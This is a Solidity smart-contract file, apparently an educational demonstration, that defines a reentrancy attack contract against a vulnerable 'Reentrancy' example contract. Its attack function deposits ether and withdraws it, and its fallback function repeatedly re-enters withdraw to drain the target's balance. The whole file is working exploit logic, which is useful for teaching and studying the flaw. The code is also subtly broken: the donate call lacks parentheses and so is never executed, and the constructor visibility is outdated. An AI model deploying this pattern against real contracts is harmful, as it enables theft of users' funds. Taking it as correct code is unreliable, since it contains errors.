//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import './ReentrancyEx.sol';

contract ReentrancyAttack {
   Reentrancy public reentrancy;

   constructor(address payable _reenterancyAddress) public {
       reentrancy = Reentrancy(_reenterancyAddress);
   }

   function attack() external payable {
       require(msg.value >= 1 ether);
       reentrancy.donate{value: msg.value};
       reentrancy.withdraw(1 ether);
   }

   fallback() external payable {
       if(address(reentrancy).balance >= 1 ether) {
           reentrancy.withdraw(1 ether);
       }
   }
}